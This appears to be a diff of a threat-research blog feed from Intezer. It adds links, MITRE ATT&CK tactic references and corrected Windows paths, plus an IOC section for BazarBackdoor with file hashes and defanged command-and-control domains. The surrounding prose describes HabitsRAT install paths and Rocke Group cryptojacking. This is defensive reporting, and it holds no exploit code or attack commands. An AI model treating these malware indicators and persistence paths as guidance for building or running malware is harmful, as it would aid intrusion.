 &lt;li&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;FireEye, APT28: A Window Into Russia&amp;rsquo;s Cyber Espionage Operations?&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://securelist.com/greyenergys-overlap-with-zebrocy/89506/"target="_blank" rel="noopener"&gt;Kaspersky, GreyEnergy&amp;rsquo;s Overlap with Zebrocy&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"target="_blank" rel="noopener"&gt;Intezer, A Zebra in Gopher&amp;rsquo;s Clothing: Russian APT Uses COVID-19 Lures to Deliver Zebrocy&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="../../../2020/12/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"&gt;Intezer, A Zebra in Gopher&amp;rsquo;s Clothing: Russian APT Uses COVID-19 Lures to Deliver Zebrocy&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/"target="_blank" rel="noopener"&gt;Quointelligence, APT28 Delivers Zebrocy Malware Campaign using NATO Theme as Lure&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/"target="_blank" rel="noopener"&gt;ESET, Sednit Update: Analysis of Zebrocy&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://vk-intel.org/2019/01/22/lets-learn-progression-of-apt28-autoit-zebrocy-downloaders-source-code-level-analysis/"target="_blank" rel="noopener"&gt;VK-Intel. Let&amp;rsquo;s Learn: Progression of APT28 AutoIt Zebrocy Downloaders: Source-Code Level Analysis&lt;/a&gt;&lt;/li&gt;
@@ -16250,7 +16280,7 @@ the scanner will classify all binary code residing in your machine&amp;rsquo;s m
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;Execution&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/tactics/TA0002/"target="_blank" rel="noopener"&gt;Execution&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1059/001/"target="_blank" rel="noopener"&gt;T1059.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1059/001/"target="_blank" rel="noopener"&gt;PowerShell&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
@@ -16265,7 +16295,7 @@ the scanner will classify all binary code residing in your machine&amp;rsquo;s m
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1047/"target="_blank" rel="noopener"&gt;Windows Management Instrumentation&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Persistence&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/tactics/TA0003/"target="_blank" rel="noopener"&gt;Persistence&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1547/001/"target="_blank" rel="noopener"&gt;T1547.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1547/001/"target="_blank" rel="noopener"&gt;Registry Run Keys / Startup Folder&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
@@ -16290,12 +16320,12 @@ the scanner will classify all binary code residing in your machine&amp;rsquo;s m
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1053/005/"target="_blank" rel="noopener"&gt;Scheduled Task&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Privilege Escalation&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/tactics/TA0004/"target="_blank" rel="noopener"&gt;Privilege Escalation&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1548/002/"target="_blank" rel="noopener"&gt;T1548.002&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1548/002/"target="_blank" rel="noopener"&gt;Bypass User Account Control&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Defense Evasion&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/tactics/TA0005/"target="_blank" rel="noopener"&gt;Defense Evasion&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1562/001/"target="_blank" rel="noopener"&gt;T1562.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1562/001/"target="_blank" rel="noopener"&gt;Disable or Modify Tools&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
@@ -16305,12 +16335,12 @@ the scanner will classify all binary code residing in your machine&amp;rsquo;s m
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1070/004/"target="_blank" rel="noopener"&gt;File Deletion&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Credential Access&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/tactics/TA0006/"target="_blank" rel="noopener"&gt;Credential Access&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1003/001/"target="_blank" rel="noopener"&gt;T1003.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1003/001/"target="_blank" rel="noopener"&gt;LSASS Memory&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Discovery&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/tactics/TA0007/"target="_blank" rel="noopener"&gt;Discovery&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1082/"target="_blank" rel="noopener"&gt;T1082&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1082/"target="_blank" rel="noopener"&gt;System Information Discovery&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
@@ -16325,7 +16355,7 @@ the scanner will classify all binary code residing in your machine&amp;rsquo;s m
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1018/"target="_blank" rel="noopener"&gt;Remote System Discovery&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Command and Control&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/tactics/TA0011/"target="_blank" rel="noopener"&gt;Command and Control&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1571/"target="_blank" rel="noopener"&gt;T1571&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1571/"target="_blank" rel="noopener"&gt;Non-Standard Port&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
@@ -16499,6 +16529,42 @@ and classifies them using genetic code analysis technology.&lt;/li&gt;
 &lt;img src="https://research.intezer.com/blog/2021/05/wrapping-up-a-year-of-infamous-bazar-campaigns/images/fig6.png" title="Endpoint scan on an infected machine" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Endpoint scan on an infected machine&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;IOCs&lt;span class="hx:absolute hx:-mt-20" id="iocs"&gt;&lt;/span&gt;
+&lt;a href="#iocs" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Files&lt;span class="hx:absolute hx:-mt-20" id="files"&gt;&lt;/span&gt;
+&lt;a href="#files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;3d483689f373a12f6f9607079b9cebb9 signed BazarBackdoor
+bcda9eed7688400b654b88e4f0bdb3f0 signed BazarBackdoor
+52a8527e0d7cd86b1d04ccc80eb6595e signed BazarBackdoor
+06118d290e54e106d0571234946c2e0d signed BazarBackdoor
+3578e96b72cba790179d546f11e045ca Bazar loader injecting a fileless payload
+1d528a2e1d0a097421e57f86ba04e79f BazarLoader written in Nim&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;Network&lt;span class="hx:absolute hx:-mt-20" id="network"&gt;&lt;/span&gt;
+&lt;a href="#network" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;ds45x1[.]com
+x57gc[.]com
+x55gc[.]com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
 &lt;h2&gt;References&lt;span class="hx:absolute hx:-mt-20" id="references"&gt;&lt;/span&gt;
 &lt;a href="#references" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://www.bleepingcomputer.com/news/security/bazarbackdoor-trickbot-gang-s-new-stealthy-network-hacking-malware/"target="_blank" rel="noopener"&gt;https://www.bleepingcomputer.com/news/security/bazarbackdoor-trickbot-gang-s-new-stealthy-network-hacking-malware/&lt;/a&gt;&lt;/li&gt;
@@ -16515,7 +16581,8 @@ and classifies them using genetic code analysis technology.&lt;/li&gt;
 &lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;</description></item><item><title>Why Relying on the Cloud Provider for Security is Not Enough</title><link>https://research.intezer.com/blog/2021/05/why-relying-on-the-cloud-provider-for-security-is-not-enough/</link><pubDate>Thu, 20 May 2021 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2021/05/why-relying-on-the-cloud-provider-for-security-is-not-enough/</guid><description>
-&lt;p&gt;73% of organizations using the cloud are not sure which parts of security fall
+&lt;p&gt;&lt;a href="https://blog.paloaltonetworks.com/2020/06/cloud-native-security-genome/"target="_blank" rel="noopener"&gt;73% of organizations&lt;/a&gt;
+using the cloud are not sure which parts of security fall
 under their responsibility. Ultimately, the customer is responsible for
 security in the cloud, meaning protecting the workloads (applications and code)
 hosted on top of the virtual resources created in the cloud provider&amp;rsquo;s
@@ -16649,7 +16716,8 @@ vulnerability or a backdoor in the supply chain you must be able to detect it.&l
 extension works and how we found a fatal vulnerability in the extension
 mechanism affecting Azure VM Linux systems. As part of the responsible
 disclosure policy, we reported the vulnerability to Microsoft Security Response
-Center (MSRC). They soon patched and assigned it CVE-2021-27075. This
+Center (MSRC). They soon patched and assigned it
+&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27075"target="_blank" rel="noopener"&gt;CVE-2021-27075&lt;/a&gt;. This
 vulnerability would have allowed an unprivileged user to leak any Azure VM
 extension&amp;rsquo;s private data. Paired with the design of the VMAccess extension, an
 official Azure extension built for assisting system admins, we will demonstrate
@@ -16936,7 +17004,7 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;h3&gt;Installation&lt;span class="hx:absolute hx:-mt-20" id="installation"&gt;&lt;/span&gt;
 &lt;a href="#installation" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When the binary is run, it installs itself into a folder. The Windows version&amp;rsquo;s
-location is &lt;code&gt;%SystemDrive%WindowsDefenderMsMpEng.exe&lt;/code&gt; while the Linux version
+location is &lt;code&gt;%SystemDrive%\Windows\Defender\MsMpEng.exe&lt;/code&gt; while the Linux version
 is &lt;code&gt;$HOME/.config/polkitd/polkitd&lt;/code&gt;. This will result in the malware being
 installed under &lt;code&gt;/root&lt;/code&gt; if it&amp;rsquo;s being run with root privileges.&lt;/p&gt;
 &lt;p&gt;After the malware has installed itself, it checks if the persistence method has
@@ -17045,8 +17113,8 @@ and an email address of &amp;ldquo;&lt;a href="mailto:a@a.a"&gt;a@a.a&lt;/a&gt;&
 &lt;p&gt;The key is stored and written to disk. The Linux version of HabitsRAT writes to
 &lt;code&gt;$HOME/.config/.accounts-daemon/accounts-daemon.login.conf&lt;/code&gt; if it is running as
 a normal user or to &lt;code&gt;/usr/share/accounts-daemon/accounts-daemon.so&lt;/code&gt;. The
-Windows version uses &lt;code&gt;%SystemDrive%WindowsDefenderMsMpEng.dll&lt;/code&gt; or
-&lt;code&gt;%APPDATA%Windows NTDefenderMsMpEng.dll&lt;/code&gt; instead.&lt;/p&gt;
+Windows version uses &lt;code&gt;%SystemDrive%\Windows\Defender\MsMpEng.dll&lt;/code&gt; or
+&lt;code&gt;%APPDATA%\Windows NT\Defender\MsMpEng.dll&lt;/code&gt; instead.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2021/04/habitsrat-used-to-target-linux-and-windows-servers/images/fig2.png" title="Figure 2: Generation of public-private key pair using the open-source library from Proton Mail." alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Figure 2: Generation of public-private key pair using the open-source library from Proton Mail.&lt;/figcaption&gt;
@@ -17393,7 +17461,7 @@ cryptojacking malware on Linux machines. The group has been
 &lt;a href="https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html"target="_blank" rel="noopener"&gt;active since 2018&lt;/a&gt;
 and continues to evolve by modifying its tools and techniques to stay evasive.
 In 2019, we reported that Rocke Group was
-&lt;a href="https://intezer.com/blog/cloud-security/technical-analysis-cryptocurrency-mining-war-on-the-cloud/"target="_blank" rel="noopener"&gt;competing&lt;/a&gt;
+&lt;a href="../../../2019/05/technical-analysis-cryptocurrency-mining-war-on-the-cloud/"&gt;competing&lt;/a&gt;
 with Pacha Group for cryptomining positioning on Linux-based servers in the
 cloud. We have found a
 &lt;a href="https://analyze.intezer.com/files/fe27d4a8a5f299b0b25d10816e98cef2852af6dc3541bf25a77960b1573ca61d"target="_blank" rel="noopener"&gt;new malware variant&lt;/a&gt;
